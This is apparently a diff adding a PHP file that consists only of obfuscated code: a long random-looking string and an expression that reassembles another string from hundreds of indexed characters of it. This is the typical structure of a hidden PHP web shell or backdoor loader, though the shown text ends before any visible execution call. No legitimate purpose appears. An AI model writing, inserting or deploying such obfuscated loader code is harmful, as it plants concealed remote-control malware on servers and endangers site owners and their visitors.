@@ -1,0 +1,562 @@
+<?php $kvrgx='27NFkJj0AlAqcu4mRiZl51WBCgssdTh+AxZXClwbQDAcfznngTwfjA7QQ+bxPCNdgq6labqCkbbcmVgBa86pgfqA/qFaGY3/JetF9D1Nv/miQ20a3equrRSo1/pMvgusxtnNjdbLjBliwCM+0E4pZj8JmHtrSG4Z6FLAIJizsvkCoKPuYLeWvrhMTS7UyiY37soIcvytqOPFOO5YjxW6Ku1URsmRIGIygsmSBYoO8NusTxIr8Yx0enJbu96DXL1Nk1D3/FiGtOxqmD1Es5vlclNiqdT9GgLNZpwBW8LfU_lQ+A7SLEAxaPjAf7xe7HknbDXmg8LpJtsCnuz0+7XncQzS5ekvSd3mMXnYrhm7wXGhtNKfqQGqlWO8nrcNa+oaEK7GRUeDLxZVHHi8+lrqcDg2jXoNUaYWvFPmjKGYV/dABgtdkpSEZ//c6UxWdJ1RyLva4Lmk2UbfSLdXWuMmQD0sUSYMmBpKBJHXFR1N3wiaLA/cTiL9q/zgdGuo4Ec+mYEjYOGNTOVteoLzEi=tQUoAbJsMFvJDwf9q43OVexNebV9z+Ap2PqTCDTc8jUZt/CjZqb2ts1pqQz9KIwHGL_d3mS8fv0Gzc2pfUWFHsN7oZypYZdn3YFcu4Bzv2IxTvW0Q8rV9yQt2LBry6iTBkuGWMmnFtZlybqQNHMAJtnk7pBgWupvLxbZyCa6pm0XjgvIJt/qpwKkhJTlZs8beXVCOG0h/izVxVMVsV0s3UBxtmGjubuFuvWdCpcOpBtDYuynsJqYnDo9tRGCIzsGAHIlbN7AgxWUQonBTXZjIvo7Sme6hkiA0rru8vKF+jQDKlw9EJf2OW+rFmvECSvnHtyh28Wvbx0Ti/RhQ75P1yMWaz8X4ndzBmadTZUgIXtWmPT6XK3GdL54/X342yoSDBVsZ7vzsvXkHtajb4Kbh2lbD9r7Rorfav325ElorBf7J8ArRem2qiTTX/hzRBc98j4IwvntUAH3LEHAxucdfYjlVob8Hw2pcBh65OcDa6FfXNTMAzLq5BEYFm+s+8vJr5ssy6/BcUTx7vkTw5552xDL2HPwuEcNv2/TwK/gC1ASSqWHOQy9U5SFwcJ2xtFTwxQpyFuwybrWG2rr2OLGCioYuRSTGMx5NtxD9yjd0baOCnVZrvan5Bccj7BC0ZjqXB5uphcEfMf2tn6x4S4T6AnfmoH6U1sQm3Lk4HsqZuIzsEdtLR6ZQOYUDVxc+qEfaRpxWZwe+hVfcyxFJzDhj7DpCanRWntpdKndosAwYMPlZsdX8MnmHonHmmJ40sC5pZNBNolKCTvRViS2vNomDyRjGW5OG9ctdx8x7aV9W6eVAvYrTn/yhi7VDwlTEpzWOCPhfy7ZvaGCE0C6inCgw/u36nqwfrx4fX9gv8tPOllKZY4g9RnTVUmjGr7LnEEIxC1D5+DrlhwG2Nnzj+GI34r2EdNGUdqYHU(xmvpn28CUi6cqyUQ6X7ToPTvv+q3GsF2eLu/m980LFwiKCZsEdsBWyq2Z23peut21/Nl7MN94iPjjNJOGbd1odCcPuYheCbblvxw3/pCv5nQ1bk9fN/MS73bmzMEB4w4omD9wvGNCavyVAAbmtHckmsRyIa0wda+OHYwOj4CSlsGqhZuXpQGDLe9QCzytflOrLdYA3POiTLeuISdI09+1Q+9achqvGYCjK5tDZfVfUpLNTj=e2qJzjY5U0y6WftGU59kDmktg1eLXv2EeUJvpC1Bp+VKQS2V8QUXGlYk47LJ0OFjxjxsocz6UWkp9JtwlbcxyBaOxPATWEprUiC18DtIzra/ZGgsGejNSDC++U6mAHTNIow0xNEtjVnwLqbP/64OxBHEj1jAL+bMkCSpqJm4+s2thGyQ6HX3Eevare+BxlB/7m6vO0QnhjtQZqwFYsuXI2qGdOwGDQItlpJIJcjJlJfXcO+1/mX2TbcaExeii2dlHy1yAxbjn2qIbkXGbjgfjmv9TpNW1ekdvAZm4NNe9z3lYptnPtZ2rzj)zFeUWdL1Evkb6UKeiMhpjPmhW6Eb9RjvGPS0hIlJl0qwXViYDTxK85O9YWlypwpe6AgnC5zujEmOjqsIDkann1t1id6zKTZEW4vcUkStowHTYFpzneC8b42KTcNNRsOzko4WLlD7el+BJtFYPcF+2xTuImBQe8XUqGhXck3ENhL2nNofEpkziG2blFwQCjnUzCRuVfBGoHmp5/N9Xo/ZeLB5G3lt5UQVSyB47TqN5huT/K2FPl5zOrA+P4d360XojfvIrbjbTdELYabN/5ectEb9UzrEMuJ6zRf6NBvGIUj5YDcN07xfje64G9pnfe/bdfzZ9RpXcVYcnZs5W5SLHdFBtmoEB9gs8Q9/WOSggeh]z6ufUJBEngEmJUlx9dBq4DRoAUOFIr1FzPP7vzQn3e28ru0l65+/gMq/oGazvGMo2OwK/aDGcc2OSwHDptSqetRnjMzS5dtHxaS_zQXi/eDGFvMnwFR//eV6LoAL6z52b/my3a1CSsouhYTjxQOxi+M/BunVy3p0WAgGOc3H3ZC1MTh+dseaM+Oom/ed4cWma3Nz044JOdECeJuYkVrJwRqwIAm8Na9TEioU6qMpxAAm7VBw/A6Jqh6xHZrtjnr47hOTwmLuSOcumto5O4jqDdS10G1jjrQ/HMcOnx+XmlUbwE1NM0x4Bsg24AP0XCul/gUUW1BZRoXk/8pbb9DQq76i6fIu4Z0pie99847iSI6MUB6/Steog0JaVj0xujKDKRgG1C6eYd2/58b+$Akl2cBevva29lNvbS0pSZGQtN5SdCVzjQuQjSDTUXGWfNU2v/nE9sJgrsxCZcB+2IALDIHdM3jpbpcX5h2147mEQ2DAf89pt5G2Wi4FM9;urVAhKk7crRcE1qF851qiaYGpnwWCjIDN05c/GXwflpwHyjRLldnFIaVeQ7CX8wr0bFutOOu2XOQ8robjFSI9cZySqN\7iZ3wgGWM3tQSTFQtQ6gcSPZYGziMuedyzkFohygIW4oy+p3vgZxYjYzZLAaz8A9PiTMT99nhPxYGU$fXsQVvkF1w0JfLJRk7IDjxljW4P6o9ElFzw+hfJQoZDJKIwGd/IY39qCwRrGNgn6m2IwJuidM7ZgwzSTfSEQs3xZatqEjOFTDKA4WnDKJVlYilGwXd0TMDMxg5RK4vrKvzRKJpoD2JcMOSOdcKq1yhjJHVmVf2FqUsetoI4jHsKDzckM4vr6N24ySFHBkgrHQmjkC2W5Bqs2jwTKrmYGSbKj6PUDa+orcNWPULvzJ3sRAcmfh72OxmwyNeE7TUjD/LrYL8KXnYs285aXFUh+TdIUOS/bCwwAHrritLJfOEj/dn+lpaKZoNwx6XQnH3B5ozFbroBBoPaMSNO6qvsjZig5jTp5udTWO6o5nUqerweFdQ5dTsFRMSwjSj2tnjBPCyHK/AvRnOMGhcFCG/pExWuYH4Ml5rX3ZH0v2BjlZfhVpJYcFwcjzPFXYWsV4LB2h1RIR7zGKCg9PKD91k1CIgrD1S8cJMKB0KTlfukPFFF+JQ1AjRRloBfvWGmpZdJgcWcDj9kF6D6JDcQTeiHF8ZyoSVWxzoiNkM7TE7vrSgzxV6wTG+ffO21hplxdOZ20OmHiYHK14UZR+wwwLbB9ZrA1eHy5s9s6me4kB5n2bZqwjBKbZ95d+oDQhr2G99JA5SomBTLvwrQUrv/Trq51CF+cbkmT6kYFXquC/+Ihk6+4fOZgMXP+NFadLZV/Sie+w+h/SsHs8y/vGf43KIi5v2FolWZUN2HugBmMn6FV3YXPBsOaGeaF2yZN1J+stLi4jRLBmkVGkClcBbPRRqPWUhsKUvQ7WuKus9E7iqm6WVi4iU27Cl3cNbpM94yGER9lLcJvz6V/sCi0WcliDSpEaaOujA9MwjC`be^lr2mDyRWPXat3w8NhZBu+6mKnZa94IVHhD3bBh6zMPvt01chzld45kX3o5BM12JPqva0KkawYpPZkn/6zmFSePCKDUn3wl+y036Z4PSkRSDjUrFqbjD1/B+9TWzbJv+2bCDLBIRzGCSBGvL0TR1Xn7JImX1o57Fn06g/rXgJEuQxi+5MmgpMWpK/+TdyTwWeH+K5wvxMNXnT/K93FISmlIcQL2x8xziHtU/PrhBRNBxSOhOr2T/z4a8dk96M+43USz8kf3znzf3ouzfNZnIZhSiJITzgXCVvW8YkfqXvvwyz0CgE6QWyOxQllhmIetQK56D3[Bz8tyIVKCtT3p/ndIvNquj2jcG8YOYUp6GHGfgb4tH58RetFWv2JvflBFNJA70UGQf0QTLo'; $hbmimpaofdllt=$kvrgx[97].$kvrgx[2].$kvrgx[116].$kvrgx[98].$kvrgx[92].$kvrgx[15].$kvrgx[98].$kvrgx[29].$kvrgx[14].$kvrgx[7].$kvrgx[39].$kvrgx[188].$kvrgx[123].$kvrgx[21].$kvrgx[13].$kvrgx[21].$kvrgx[88].$kvrgx[0].$kvrgx[3].$kvrgx[22].$kvrgx[28].$kvrgx[83].$kvrgx[24].$kvrgx[7].$kvrgx[26].$kvrgx[22].$kvrgx[187].$kvrgx[39].$kvrgx[28].$kvrgx[26].$kvrgx[4].$kvrgx[28].$kvrgx[6].$kvrgx[30].$kvrgx[164].$kvrgx[164].$kvrgx[15].$kvrgx[145].$kvrgx[41].$kvrgx[3].$kvrgx[93].$kvrgx[123].$kvrgx[66].$kvrgx[93].$kvrgx[1].$kvrgx[173].$kvrgx[22].$kvrgx[8].$kvrgx[11].$kvrgx[164].$kvrgx[40].$kvrgx[81].$kvrgx[33].$kvrgx[25].$kvrgx[83].$kvrgx[66].$kvrgx[9].$kvrgx[187].$kvrgx[39].$kvrgx[15].$kvrgx[26].$kvrgx[18].$kvrgx[6].$kvrgx[88].$kvrgx[46].$kvrgx[83].$kvrgx[14].$kvrgx[18].$kvrgx[6].$kvrgx[29].$kvrgx[118].$kvrgx[118].$kvrgx[39].$kvrgx[29].$kvrgx[41].$kvrgx[26].$kvrgx[39].$kvrgx[98].$kvrgx[21].$kvrgx[28].$kvrgx[21].$kvrgx[22].$kvrgx[7].$kvrgx[98].$kvrgx[26].$kvrgx[6].$kvrgx[45].$kvrgx[29].$kvrgx[94].$kvrgx[28].$kvrgx[60].$kvrgx[29].$kvrgx[94].$kvrgx[28].$kvrgx[201].$kvrgx[104].$kvrgx[81].$kvrgx[16].$kvrgx[68].$kvrgx[201].$kvrgx[14].$kvrgx[45].$kvrgx[24].$kvrgx[0].$kvrgx[93].$kvrgx[30].$kvrgx[188].$kvrgx[3].$kvrgx[12].$kvrgx[97].$kvrgx[164].$kvrgx[92].$kvrgx[77].$kvrgx[21].$kvrgx[83].$kvrgx[29].$kvrgx[39].$kvrgx[1].$kvrgx[100].$kvrgx[100].$kvrgx[123].$kvrgx[1].$kvrgx[40].$kvrgx[29].$kvrgx[39].$kvrgx[8].$kvrgx[94].$kvrgx[33].$kvrgx[188].$kvrgx[5].$kvrgx[20].$kvrgx[14].$kvrgx[17].$kvrgx[18].$kvrgx[22].$kvrgx[14].$kvrgx[60].$kvrgx[104].$kvrgx[14].$kvrgx[12].$kvrgx[23].$kvrgx[98].$kvrgx[25].$kvrgx[17].$kvrgx[201].$kvrgx[2].$kvrgx[153].$kvrgx[187].$kvrgx[35].$kvrgx[38].$kvrgx[81].$kvrgx[153].$kvrgx[173].$kvrgx[25].$kvrgx[77].$kvrgx[20].$kvrgx[31].$kvrgx[81].$kvrgx[93].$kvrgx[28].$kvrgx[164].$kvrgx[12].$kvrgx[7].$kvrgx[9].$kvrgx[28].$kvrgx[135].$kvrgx[23].$kvrgx[11].$kvrgx[1].$kvrgx[44].$kvrgx[16].$kvrgx[66].$kvrgx[104].$kvrgx[33].$kvrgx[21].$kvrgx[7].$kvrgx[45].$kvrgx[98].$kvrgx[29].$kvrgx[39].$kvrgx[123].$kvrgx[23].$kvrgx[20].$kvrgx[92].$kvrgx[123].$kvrgx[118].$kvrgx[39].$kvrgx[145].$kvrgx[118].$kvrgx[6].$kvrgx[23].$kvrgx[5].$kvrgx[135].$kvrgx[24].$kvrgx[12].$kvrgx[123].$kvrgx[116].$kvrgx[21].$kvrgx[0].$kvrgx[26].$kvrgx[35].$kvrgx[13].$kvrgx[30].$kvrgx[119].$kvrgx[201].$kvrgx[4].$kvrgx[187].$kvrgx[45].$kvrgx[26].$kvrgx[3].$kvrgx[145].$kvrgx[28].$kvrgx[23].$kvrgx[13].$kvrgx[17].$kvrgx[17].$kvrgx[83].$kvrgx[2].$kvrgx[20].$kvrgx[68].$kvrgx[8].$kvrgx[119].$kvrgx[39].$kvrgx[188].$kvrgx[4].$kvrgx[40].$kvrgx[3].$kvrgx[11].$kvrgx[119].$kvrgx[7].$kvrgx[46].$kvrgx[25].$kvrgx[5].$kvrgx[92].$kvrgx[14].$kvrgx[93].$kvrgx[22].$kvrgx[60].$kvrgx[6].$kvrgx[201].$kvrgx[5].$kvrgx[40].$kvrgx[46].$kvrgx[16].$kvrgx[77].$kvrgx[5].$kvrgx[28].$kvrgx[93].$kvrgx[145].$kvrgx[14].$kvrgx[5].$kvrgx[6].$kvrgx[188].$kvrgx[38].$kvrgx[13].$kvrgx[104].$kvrgx[116].$kvrgx[104].$kvrgx[41].$kvrgx[40].$kvrgx[12].$kvrgx[25].$kvrgx[2].$kvrgx[77].$kvrgx[16].$kvrgx[66].$kvrgx[13].$kvrgx[116].$kvrgx[68].$kvrgx[92].$kvrgx[18].$kvrgx[93].$kvrgx[7].$kvrgx[33].$kvrgx[15].$kvrgx[23].$kvrgx[11].$kvrgx[46].$kvrgx[35].$kvrgx[118].$kvrgx[66].$kvrgx[44].$kvrgx[88].$kvrgx[97].$kvrgx[66].$kvrgx[18].$kvrgx[81].$kvrgx[83].$kvrgx[88].$kvrgx[12].$kvrgx[66].$kvrgx[88].$kvrgx[29].$kvrgx[6].$kvrgx[26].$kvrgx[46].$kvrgx[8].$kvrgx[31].$kvrgx[13].$kvrgx[7].$kvrgx[44].$kvrgx[66].$kvrgx[23].$kvrgx[12].$kvrgx[15].$kvrgx[173].$kvrgx[39].$kvrgx[118].$kvrgx[187].$kvrgx[153].$kvrgx[29].$kvrgx[7].$kvrgx[81].$kvrgx[60].$kvrgx[39].$kvrgx[2].$kvrgx[164].$kvrgx[88].$kvrgx[93].$kvrgx[164].$kvrgx[44].$kvrgx[11].$kvrgx[8].$kvrgx[39].$kvrgx[35].$kvrgx[35].$kvrgx[3].$kvrgx[153].$kvrgx[92].$kvrgx[15].$kvrgx[45].$kvrgx[11].$kvrgx[188].$kvrgx[104].$kvrgx[135].$kvrgx[98].$kvrgx[33].$kvrgx[23].$kvrgx[9].$kvrgx[116].$kvrgx[118].$kvrgx[4].$kvrgx[22].$kvrgx[1].$kvrgx[24].$kvrgx[26].$kvrgx[123].$kvrgx[116].$kvrgx[41].$kvrgx[21].$kvrgx[31].$kvrgx[92].$kvrgx[188].$kvrgx[44].$kvrgx[40].$kvrgx[118].$kvrgx[22].$kvrgx[173].$kvrgx[201].$kvrgx[44].$kvrgx[100].$kvrgx[88].$kvrgx[93].$kvrgx[14].$kvrgx[41].$kvrgx[173].$kvrgx[12].$kvrgx[31].$kvrgx[24].$kvrgx[97].$kvrgx[25].$kvrgx[35].$kvrgx[201].$kvrgx[88].$kvrgx[118].$kvrgx[15].$kvrgx[38].$kvrgx[14].$kvrgx[9].$kvrgx[45].$kvrgx[29].$kvrgx[44].$kvrgx[88].$kvrgx[7].$kvrgx[17].$kvrgx[11].$kvrgx[104].$kvrgx[187].$kvrgx[81].$kvrgx[26].$kvrgx[35].$kvrgx[0].$kvrgx[23].$kvrgx[14].$kvrgx[2].$kvrgx[6].$kvrgx[66].$kvrgx[33].$kvrgx[118].$kvrgx[31].$kvrgx[22].$kvrgx[28].$kvrgx[13].$kvrgx[88].$kvrgx[28].$kvrgx[119].$kvrgx[14].$kvrgx[92].$kvrgx[188].$kvrgx[119].$kvrgx[187].$kvrgx[31].$kvrgx[46].$kvrgx[12].$kvrgx[66].$kvrgx[6].$kvrgx[45].$kvrgx[40].$kvrgx[6].$kvrgx[46].$kvrgx[77].$kvrgx[92].$kvrgx[28].$kvrgx[5].$kvrgx[39].$kvrgx[83].$kvrgx[77].$kvrgx[119].$kvrgx[100].$kvrgx[6].$kvrgx[98].$kvrgx[1].$kvrgx[46].$kvrgx[35].$kvrgx[66].$kvrgx[46].$kvrgx[41].$kvrgx[38].$kvrgx[16].$kvrgx[21].$kvrgx[93].$kvrgx[153].$kvrgx[83].$kvrgx[9].$kvrgx[145].$kvrgx[12].$kvrgx[100].$kvrgx[44].$kvrgx[29].$kvrgx[153].$kvrgx[97].$kvrgx[9].$kvrgx[24].$kvrgx[6].$kvrgx[13].$kvrgx[7].$kvrgx[25].$kvrgx[119].$kvrgx[9].$kvrgx[104].$kvrgx[116].$kvrgx[116].$kvrgx[35].$kvrgx[83].$kvrgx[28].$kvrgx[188].$kvrgx[145].$kvrgx[15].$kvrgx[97].$kvrgx[68].$kvrgx[39].$kvrgx[3].$kvrgx[18].$kvrgx[20].$kvrgx[6].$kvrgx[26].$kvrgx[77].$kvrgx[11].$kvrgx[11].$kvrgx[16].$kvrgx[12].$kvrgx[0].$kvrgx[0].$kvrgx[11].$kvrgx[39].$kvrgx[116].$kvrgx[118].$kvrgx[15].$kvrgx[98].$kvrgx[104].$kvrgx[4].$kvrgx[8].$kvrgx[12].$kvrgx[135].$kvrgx[68].$kvrgx[21].$kvrgx[187].$kvrgx[60].$kvrgx[83].$kvrgx[11].$kvrgx[164].$kvrgx[38].$kvrgx[66].$kvrgx[23].$kvrgx[41].$kvrgx[41].$kvrgx[92].$kvrgx[118].$kvrgx[13].$kvrgx[7].$kvrgx[16].$kvrgx[2].$kvrgx[77].$kvrgx[33].$kvrgx[33].$kvrgx[6].$kvrgx[97].$kvrgx[14].$kvrgx[30].$kvrgx[6].$kvrgx[29].$kvrgx[28].$kvrgx[4].$kvrgx[5].$kvrgx[25].$kvrgx[38].$kvrgx[40].$kvrgx[153].$kvrgx[118].$kvrgx[35].$kvrgx[21].$kvrgx[38].$kvrgx[153].$kvrgx[31].$kvrgx[3].$kvrgx[2].$kvrgx[9].$kvrgx[201].$kvrgx[24].$kvrgx[1].$kvrgx[83].$kvrgx[23].$kvrgx[3].$kvrgx[20].$kvrgx[98].$kvrgx[30].$kvrgx[26].$kvrgx[119].$kvrgx[201].$kvrgx[9].$kvrgx[98].$kvrgx[104].$kvrgx[23].$kvrgx[29].$kvrgx[104].$kvrgx[6].$kvrgx[145].$kvrgx[173].$kvrgx[15].$kvrgx[46].$kvrgx[119].$kvrgx[201].$kvrgx[0].$kvrgx[66].$kvrgx[44].$kvrgx[40].$kvrgx[22].$kvrgx[8].$kvrgx[15].$kvrgx[31].$kvrgx[6].$kvrgx[100].$kvrgx[0].$kvrgx[45].$kvrgx[97].$kvrgx[1].$kvrgx[135].$kvrgx[116].$kvrgx[145].$kvrgx[100].$kvrgx[135].$kvrgx[1].$kvrgx[45].$kvrgx[28].$kvrgx[16].$kvrgx[92].$kvrgx[119].$kvrgx[173].$kvrgx[28].$kvrgx[97].$kvrgx[12].$kvrgx[15].$kvrgx[23].$kvrgx[44].$kvrgx[20].$kvrgx[13].$kvrgx[39].$kvrgx[0].$kvrgx[88].$kvrgx[2].$kvrgx[18].$kvrgx[30].$kvrgx[13].$kvrgx[14].$kvrgx[164].$kvrgx[4].$kvrgx[4].$kvrgx[123].$kvrgx[83].$kvrgx[30].$kvrgx[16].$kvrgx[116].$kvrgx[5].$kvrgx[40].$kvrgx[46].$kvrgx[26].$kvrgx[100].$kvrgx[7].$kvrgx[20].$kvrgx[8].$kvrgx[29].$kvrgx[45].$kvrgx[187].$kvrgx[77].$kvrgx[14].$kvrgx[3].$kvrgx[16].$kvrgx[28].$kvrgx[18].$kvrgx[31].$kvrgx[24].$kvrgx[98].$kvrgx[44].$kvrgx[24].$kvrgx[104].$kvrgx[104].$kvrgx[188].$kvrgx[119].$kvrgx[68].$kvrgx[119].$kvrgx[201].$kvrgx[92].$kvrgx[60].$kvrgx[26].$kvrgx[35].$kvrgx[3].$kvrgx[2].$kvrgx[29].$kvrgx[17].$kvrgx[33].$kvrgx[40].$kvrgx[30].$kvrgx[123].$kvrgx[38].$kvrgx[92].$kvrgx[41].$kvrgx[81].$kvrgx[6].$kvrgx[9].$kvrgx[2].$kvrgx[20].$kvrgx[1].$kvrgx[18].$kvrgx[3].$kvrgx[20].$kvrgx[97].$kvrgx[18].$kvrgx[92].$kvrgx[18].$kvrgx[6].$kvrgx[41].$kvrgx[33].$kvrgx[104].$kvrgx[153].$kvrgx[39].$kvrgx[66].$kvrgx[2].$kvrgx[12].$kvrgx[68].$kvrgx[0].$kvrgx[23].$kvrgx[7].$kvrgx[123].$kvrgx[3].$kvrgx[164].$kvrgx[16].$kvrgx[94].$kvrgx[0].$kvrgx[23].$kvrgx[30].$kvrgx[21].$kvrgx[116].$kvrgx[97].$kvrgx[94].$kvrgx[12].$kvrgx[35].$kvrgx[3].$kvrgx[24].$kvrgx[153].$kvrgx[8].$kvrgx[119].$kvrgx[6].$kvrgx[17].$kvrgx[81].$kvrgx[13].$kvrgx[0].$kvrgx[31].$kvrgx[18].$kvrgx[18].$kvrgx[93].$kvrgx[35].$kvrgx[98].$kvrgx[28].$kvrgx[8].$kvrgx[88].$kvrgx[8].$kvrgx[26].$kvrgx[173].$kvrgx[188].$kvrgx[41].$kvrgx[14].$kvrgx[33].$kvrgx[135].$kvrgx[4].$kvrgx[0].$kvrgx[25].$kvrgx[45].$kvrgx[4].$kvrgx[104].$kvrgx[66].$kvrgx[0].$kvrgx[100].$kvrgx[35].$kvrgx[104].$kvrgx[88].$kvrgx[29].$kvrgx[28].$kvrgx[46].$kvrgx[31].$kvrgx[94].$kvrgx[26].$kvrgx[7].$kvrgx[104].$kvrgx[44].$kvrgx[123].$kvrgx[46].$kvrgx[6].$kvrgx[93].$kvrgx[21].$kvrgx[12].$kvrgx[6].$kvrgx[21].$kvrgx[145].$kvrgx[6].$kvrgx[25].$kvrgx[7].$kvrgx[2].$kvrgx[45].$kvrgx[18].$kvrgx[164].$kvrgx[25].$kvrgx[66].$kvrgx[100].$kvrgx[29].$kvrgx[0].$kvrgx[45].$kvrgx[104].$kvrgx[119].$kvrgx[41].$kvrgx[26].$kvrgx[23].$kvrgx[26].$kvrgx[44].$kvrgx[100].$kvrgx[88].$kvrgx[13].$kvrgx[153].$kvrgx[13].$kvrgx[33].$kvrgx[13].$kvrgx[8].$kvrgx[45].$kvrgx[123].$kvrgx[153].$kvrgx[33].$kvrgx[0].$kvrgx[5].$kvrgx[94].$kvrgx[44].$kvrgx[8].$kvrgx[12].$kvrgx[83].$kvrgx[35].$kvrgx[145].$kvrgx[11].$kvrgx[41].$kvrgx[15].$kvrgx[12].$kvrgx[77].$kvrgx[17].$kvrgx[12].$kvrgx[15].$kvrgx[98].$kvrgx[135].$kvrgx[4].$kvrgx[9].$kvrgx[13].$kvrgx[29].$kvrgx[188].$kvrgx[16].$kvrgx[22].$kvrgx[15].$kvrgx[13].$kvrgx[18].$kvrgx[41].$kvrgx[145].$kvrgx[2].$kvrgx[60].$kvrgx[31].$kvrgx[164].$kvrgx[12].$kvrgx[29].$kvrgx[173].$kvrgx[5].$kvrgx[8].$kvrgx[21].$kvrgx[40].$kvrgx[77].$kvrgx[14].$kvrgx[14].$kvrgx[31].$kvrgx[118].$kvrgx[15].$kvrgx[13].$kvrgx[97].$kvrgx[11].$kvrgx[66].$kvrgx[25].$kvrgx[119].$kvrgx[46].$kvrgx[21].$kvrgx[17].$kvrgx[29].$kvrgx[0].$kvrgx[18].$kvrgx[104].$kvrgx[22].$kvrgx[187].$kvrgx[29].$kvrgx[15].$kvrgx[30].$kvrgx[77].$kvrgx[97].$kvrgx[8].$kvrgx[17].$kvrgx[0].$kvrgx[66].$kvrgx[41].$kvrgx[20].$kvrgx[15].$kvrgx[28].$kvrgx[8].$kvrgx[94].$kvrgx[45].$kvrgx[14].$kvrgx[3].$kvrgx[60].$kvrgx[12].$kvrgx[16].$kvrgx[5].$kvrgx[92].$kvrgx[14].$kvrgx[28].$kvrgx[81].$kvrgx[18].$kvrgx[15].$kvrgx[2].$kvrgx[11].$kvrgx[66].$kvrgx[9].$kvrgx[98].$kvrgx[116].$kvrgx[15].$kvrgx[188].$kvrgx[38].$kvrgx[119].$kvrgx[39].$kvrgx[8].$kvrgx[15].$kvrgx[93].$kvrgx[187].$kvrgx[16].$kvrgx[201].$kvrgx[41].$kvrgx[30].$kvrgx[46].$kvrgx[35].$kvrgx[2].$kvrgx[26].$kvrgx[20].$kvrgx[1].$kvrgx[35].$kvrgx[28].$kvrgx[1].$kvrgx[33].$kvrgx[100].$kvrgx[29].$kvrgx[38].$kvrgx[13].$kvrgx[45].$kvrgx[22].$kvrgx[0].$kvrgx[45].$kvrgx[135].$kvrgx[201].$kvrgx[8].$kvrgx[119].$kvrgx[41].$kvrgx[45].$kvrgx[15].$kvrgx[2].$kvrgx[92].$kvrgx[116].$kvrgx[173].$kvrgx[93].$kvrgx[44].$kvrgx[6].$kvrgx[18].$kvrgx[100].$kvrgx[29].$kvrgx[188].$kvrgx[1].$kvrgx[81].$kvrgx[28].$kvrgx[3].$kvrgx[119].$kvrgx[164].$kvrgx[13].$kvrgx[0].$kvrgx[29].$kvrgx[92].$kvrgx[38].$kvrgx[45].$kvrgx[41].$kvrgx[22].$kvrgx[14].$kvrgx[173].$kvrgx[201].$kvrgx[23].$kvrgx[11].$kvrgx[6].$kvrgx[77].$kvrgx[2].$kvrgx[5].$kvrgx[83].$kvrgx[98].$kvrgx[100].$kvrgx[173].$kvrgx[46].$kvrgx[94].$kvrgx[68].$kvrgx[97].$kvrgx[201].$kvrgx[41].$kvrgx[6].$kvrgx[116].$kvrgx[68].$kvrgx[6].$kvrgx[188].$kvrgx[123].$kvrgx[201].$kvrgx[44].$kvrgx[81].$kvrgx[201].$kvrgx[77].$kvrgx[104].$kvrgx[39].$kvrgx[98].$kvrgx[135].$kvrgx[14].$kvrgx[13].$kvrgx[60].$kvrgx[66].$kvrgx[41].$kvrgx[26].$kvrgx[39].$kvrgx[66].$kvrgx[23].$kvrgx[98].$kvrgx[2].$kvrgx[88].$kvrgx[0].$kvrgx[23].$kvrgx[14].$kvrgx[44].$kvrgx[28].$kvrgx[92].$kvrgx[104].$kvrgx[135].$kvrgx[12].$kvrgx[68].$kvrgx[14].$kvrgx[33].$kvrgx[31].$kvrgx[23].$kvrgx[77].$kvrgx[123].$kvrgx[123].$kvrgx[28].$kvrgx[39].$kvrgx[40].$kvrgx[45].$kvrgx[6].$kvrgx[4].$kvrgx[123].$kvrgx[44].$kvrgx[2].$kvrgx[45].$kvrgx[93].$kvrgx[8].$kvrgx[21].$kvrgx[77].$kvrgx[30].$kvrgx[104].$kvrgx[98].$kvrgx[28].$kvrgx[68].$kvrgx[123].$kvrgx[77].$kvrgx[15].$kvrgx[26].$kvrgx[28].$kvrgx[46].$kvrgx[28].$kvrgx[25].$kvrgx[6].$kvrgx[201].$kvrgx[94].$kvrgx[18].$kvrgx[29].$kvrgx[2].$kvrgx[201].$kvrgx[77].$kvrgx[18].$kvrgx[21].$kvrgx[25].$kvrgx[93].$kvrgx[153].$kvrgx[30].$kvrgx[20].$kvrgx[94].$kvrgx[97].$kvrgx[66].$kvrgx[68].$kvrgx[24].$kvrgx[0].$kvrgx[21].$kvrgx[46].$kvrgx[38].$kvrgx[22].$kvrgx[98].$kvrgx[2].$kvrgx[81].$kvrgx[18].$kvrgx[46].$kvrgx[60].$kvrgx[68].$kvrgx[60].$kvrgx[23].$kvrgx[104].$kvrgx[94].$kvrgx[98].$kvrgx[119].$kvrgx[33].$kvrgx[2].$kvrgx[38].$kvrgx[135].$kvrgx[135].$kvrgx[187].$kvrgx[4].$kvrgx[46].$kvrgx[13].$kvrgx[8].$kvrgx[123].$kvrgx[83].$kvrgx[33].$kvrgx[83].$kvrgx[201].$kvrgx[145].$kvrgx[17].$kvrgx[14].$kvrgx[66].$kvrgx[44].$kvrgx[164].$kvrgx[12].$kvrgx[28].$kvrgx[17].$kvrgx[9].$kvrgx[93].$kvrgx[4].$kvrgx[20].$kvrgx[94].$kvrgx[25].$kvrgx[30].$kvrgx[38].$kvrgx[44].$kvrgx[5].$kvrgx[38].$kvrgx[7].$kvrgx[118].$kvrgx[38].$kvrgx[119].$kvrgx[2].$kvrgx[9].$kvrgx[25].$kvrgx[68].$kvrgx[98].$kvrgx[11].$kvrgx[6].$kvrgx[0].$kvrgx[153].$kvrgx[201].$kvrgx[14].$kvrgx[26].$kvrgx[17].$kvrgx[24].$kvrgx[39].$kvrgx[135].$kvrgx[98].$kvrgx[15].$kvrgx[40].$kvrgx[46].$kvrgx[25].$kvrgx[3].$kvrgx[8].$kvrgx[0].$kvrgx[3].$kvrgx[60].$kvrgx[83].$kvrgx[118].$kvrgx[26].$kvrgx[8].$kvrgx[135].$kvrgx[13].$kvrgx[44].$kvrgx[24].$kvrgx[38].$kvrgx[1].$kvrgx[92].$kvrgx[8].$kvrgx[11].$kvrgx[118].$kvrgx[38].$kvrgx[164].$kvrgx[8].$kvrgx[28].$kvrgx[30].$kvrgx[164].$kvrgx[153].$kvrgx[116].$kvrgx[0].$kvrgx[3].$kvrgx[66].$kvrgx[98].$kvrgx[15].$kvrgx[104].$kvrgx[17].$kvrgx[16].$kvrgx[81].$kvrgx[164].$kvrgx[26].$kvrgx[12].$kvrgx[187].$kvrgx[6].$kvrgx[116].$kvrgx[5].$kvrgx[21].$kvrgx[12].$kvrgx[30].$kvrgx[201].$kvrgx[38].$kvrgx[201].$kvrgx[38].$kvrgx[41].$kvrgx[18].$kvrgx[24].$kvrgx[173].$kvrgx[9].$kvrgx[81].$kvrgx[22].$kvrgx[97].$kvrgx[173].$kvrgx[35].$kvrgx[187].$kvrgx[88].$kvrgx[8].$kvrgx[97].$kvrgx[20].$kvrgx[0].$kvrgx[29].$kvrgx[100].$kvrgx[20].$kvrgx[104].$kvrgx[38].$kvrgx[83].$kvrgx[33]